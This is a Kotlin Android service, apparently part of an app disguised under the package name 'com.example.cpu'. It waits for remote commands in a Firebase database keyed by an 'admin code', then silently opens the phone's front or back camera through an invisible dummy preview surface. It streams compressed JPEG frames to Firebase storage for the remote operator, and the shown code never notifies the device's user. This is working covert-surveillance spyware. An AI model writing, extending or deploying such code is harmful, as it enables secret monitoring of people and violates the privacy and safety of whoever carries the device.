package com.example.cpu

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Log
import android.view.Surface
import com.example.cpu.utils.PrefsManager
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import java.io.ByteArrayOutputStream

class CameraService : Service() {

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private lateinit var cameraManager: CameraManager
    private lateinit var backgroundThread: HandlerThread
    private lateinit var backgroundHandler: Handler
    private lateinit var prefsManager: PrefsManager
    private val database = FirebaseDatabase.getInstance()
    private val storage = FirebaseStorage.getInstance()
    private var isStreaming = false
    private var useFrontCamera = true // track selected camera

    companion object {
        private const val TAG = "CameraService"
        private const val IMAGE_WIDTH = 640
        private const val IMAGE_HEIGHT = 480
    }

    override fun onCreate() {
        super.onCreate()
        prefsManager = PrefsManager(this)
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        startBackgroundThread()
        listenForStreamRequest()
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground")
        backgroundThread.start()
        backgroundHandler = Handler(backgroundThread.looper)
    }

    private fun listenForStreamRequest() {
        val adminCode = prefsManager.getAdminCode() ?: return

        database.getReference("requests")
            .child(adminCode)
            .child("camera_stream")
            .child("requested")
            .addValueEventListener(object : com.google.firebase.database.ValueEventListener {
                override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                    val requested = snapshot.getValue(Boolean::class.java) ?: false
                    if (requested && !isStreaming) startCameraStream()
                    else if (!requested && isStreaming) stopCameraStream()
                }
                override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                    Log.e(TAG, "Failed to listen for stream request", error.toException())
                }
            })

        // Listen for camera selection change
        database.getReference("requests")
            .child(adminCode)
            .child("camera_stream")
            .child("camera_type")
            .addValueEventListener(object : com.google.firebase.database.ValueEventListener {
                override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                    val cameraType = snapshot.getValue(String::class.java) ?: "front"
                    useFrontCamera = cameraType == "front"
                    if (isStreaming) {
                        stopCameraStream()
                        startCameraStream()
                    }
                }
                override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
            })
    }

    private fun startCameraStream() {
        try {
            val cameraId = if (useFrontCamera) getFrontCameraId() else getBackCameraId() ?: return
            if (cameraId != null) {
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        createCaptureSession()
                        isStreaming = true
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        cameraDevice = null
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        cameraDevice = null
                        Log.e(TAG, "Camera error: $error")
                    }
                }, backgroundHandler)
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "No camera permission", e)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open camera", e)
        }
    }

    private fun getFrontCameraId(): String? = try {
        cameraManager.cameraIdList.find { id ->
            cameraManager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
        }
    } catch (e: Exception) { null }

    private fun getBackCameraId(): String? = try {
        cameraManager.cameraIdList.find { id ->
            cameraManager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
        }
    } catch (e: Exception) { null }

    private fun createCaptureSession() {
        imageReader = ImageReader.newInstance(IMAGE_WIDTH, IMAGE_HEIGHT, ImageFormat.JPEG, 2)
        imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage()
            image?.let {
                processImage(it)
                it.close()
            }
        }, backgroundHandler)

        val surface = imageReader?.surface ?: return
        val dummySurface = SurfaceTexture(0).apply { setDefaultBufferSize(IMAGE_WIDTH, IMAGE_HEIGHT) }
        val previewSurface = Surface(dummySurface)

        try {
            cameraDevice?.createCaptureSession(listOf(surface, previewSurface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        startRepeatingCapture(session, surface, previewSurface)
                    }
                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Failed to configure camera session")
                    }
                }, backgroundHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create capture session", e)
        }
    }

    private fun startRepeatingCapture(session: CameraCaptureSession, surface: Surface, previewSurface: Surface) {
        try {
            val captureRequest = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)?.apply {
                addTarget(surface)
                addTarget(previewSurface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
            }?.build()

            captureRequest?.let {
                session.setRepeatingRequest(it, null, backgroundHandler)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start repeating capture", e)
        }
    }

    private fun processImage(image: android.media.Image) {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
        val outputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 60, outputStream)
        uploadImageToFirebase(outputStream.toByteArray())
    }

    private fun uploadImageToFirebase(imageBytes: ByteArray) {
        val adminCode = prefsManager.getAdminCode() ?: return
        val deviceId = prefsManager.getDeviceId() ?: return
        val timestamp = System.currentTimeMillis()
        val storageRef = storage.reference
            .child("camera_streams")
            .child(adminCode)
            .child(deviceId)
            .child("camera_$timestamp.jpg")

        storageRef.putBytes(imageBytes)
            .addOnSuccessListener { taskSnapshot ->
                taskSnapshot.storage.downloadUrl.addOnSuccessListener { uri ->
                    val frameData = mapOf(
                        "imageUrl" to uri.toString(),
                        "timestamp" to timestamp,
                        "deviceId" to deviceId
                    )
                    database.getReference("camera_frames")
                        .child(adminCode)
                        .child(timestamp.toString())
                        .setValue(frameData)
                }
            }
            .addOnFailureListener { e -> Log.e(TAG, "Failed to upload image", e) }
    }

    private fun stopCameraStream() {
        isStreaming = false
        captureSession?.close()
        captureSession = null
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
    }

    override fun onDestroy() {
        super.onDestroy()
        stopCameraStream()
        backgroundThread.quitSafely()
    }

    override fun onBind(intent: Intent): IBinder? = null
}
